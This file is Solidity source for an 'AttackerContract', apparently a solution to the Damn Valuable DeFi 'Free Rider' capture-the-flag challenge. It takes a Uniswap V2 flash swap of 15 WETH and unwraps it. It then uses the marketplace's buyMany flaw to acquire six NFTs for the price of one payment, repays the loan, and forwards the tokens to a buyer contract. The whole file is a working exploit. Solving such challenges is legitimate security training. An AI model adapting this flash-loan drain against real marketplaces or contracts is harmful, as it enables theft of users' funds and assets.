// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "@openzeppelin/contracts/utils/Address.sol";
import "@openzeppelin/contracts/security/ReentrancyGuard.sol";
import "@openzeppelin/contracts/access/Ownable.sol";
import "@openzeppelin/contracts/token/ERC721/IERC721.sol";
import "@openzeppelin/contracts/token/ERC721/IERC721Receiver.sol";
import "@openzeppelin/contracts/utils/Address.sol";
import "@uniswap/v2-core/contracts/interfaces/IUniswapV2Callee.sol";
import "@uniswap/v2-core/contracts/interfaces/IUniswapV2Factory.sol";
import "@uniswap/v2-core/contracts/interfaces/IUniswapV2Pair.sol";
import "@openzeppelin/contracts/token/ERC20/IERC20.sol";
import "./FreeRiderNFTMarketplace.sol";
import "./FreeRiderBuyer.sol";
import "contracts/WETH9.sol";
import "@openzeppelin/contracts/token/ERC721/IERC721Receiver.sol";
import "@openzeppelin/contracts/security/ReentrancyGuard.sol";
import "../DamnValuableNFT.sol";

contract AttackerContract is Ownable, IUniswapV2Callee, ReentrancyGuard, IERC721Receiver {
    using Address for address;
    using Address for address payable;

    address public exchangeAddress;
    address public marketAddress;
    address public dumbBuyerAddress;
    address wethAddress;

    constructor (address _exchangeAdderss, address _marketAddress, address _dumbBuyerAddress, address _wethAddress) {
        exchangeAddress = _exchangeAdderss;
        marketAddress = _marketAddress;
        dumbBuyerAddress = _dumbBuyerAddress;
        wethAddress = _wethAddress;
    }

    function sliceUint(bytes memory bs, uint start)
    internal pure
    returns (uint)
    {
        require(bs.length >= start + 32, "slicing out of range");
        uint x;
        assembly {
            x := mload(add(bs, add(0x20, start)))
        }
        return x;
    }

    function attack(uint256 _amount, address wethAddress) external payable {
        require(_amount == 15 * (10 ** 18), "wrong borrow amount bro");

        bytes memory data = abi.encode(_amount, wethAddress);
        IUniswapV2Pair(exchangeAddress).swap(_amount, 0, address(this), data);
    }

    function uniswapV2Call(address sender, uint amount0, uint amount1, bytes calldata data) external override {
        // use amount0 to do sth 
        require(amount0 == 15 * (10 ** 18), "wrong borrow amount bro");

        (uint256 amount, address wethAddress1) = abi.decode(data, (uint256, address));
        uint256 fee = ((amount * 3) / 997) + 1;
        uint256 amountToPay = amount + fee;

        bytes memory byteBalance = wethAddress.functionCall(abi.encodeWithSignature(
            "balanceOf(address)",
            address(this)
        ));

        uint256 wethBalance = sliceUint(byteBalance, 0);
        require(wethBalance == amount0, "weth balance != amount");

        // get ether
        WETH9(payable(wethAddress)).withdraw(amount0);
        // payable(wethAddress).functionCall(abi.encodeWithSignature(
        //     "withdraw(uint)", 
        //     amount0
        // ));
        require(address(this).balance == 15 ether, "wrong balance sir"); 

        // attack here 
        uint256[] memory tokenIds = new uint256[] (6);
        for (uint256 i = 0; i < 6; ++i) {
            tokenIds[i] = i; 
        }
        FreeRiderNFTMarketplace(payable(marketAddress)).buyMany{value: 15 ether}(tokenIds);

        // require(address(this).balance == 90 ether, "balance != 0 ether");
        // require(0 == 1, "stop");
        WETH9(payable(wethAddress)).deposit{value: amountToPay}();
        IERC20(wethAddress).transfer(exchangeAddress, amountToPay); 
    }

    function transferToFreeRiderBuyer(address _tokenAddress, address _buyerAddress) public {
        // DamnValuableNFT(_tokenAddress).setApprovalForAll(_buyerAddress, true);
        for (uint256 tokenId = 0; tokenId < 6; ++tokenId) {
            DamnValuableNFT(_tokenAddress).safeTransferFrom(address(this), _buyerAddress, tokenId);
        }
    }

    function onERC721Received(
        address,
        address,
        uint256,
        bytes memory
    ) 
        external
        override
        nonReentrant
        returns (bytes4) 
    {
        return IERC721Receiver.onERC721Received.selector;
    }

    receive() external payable {}
}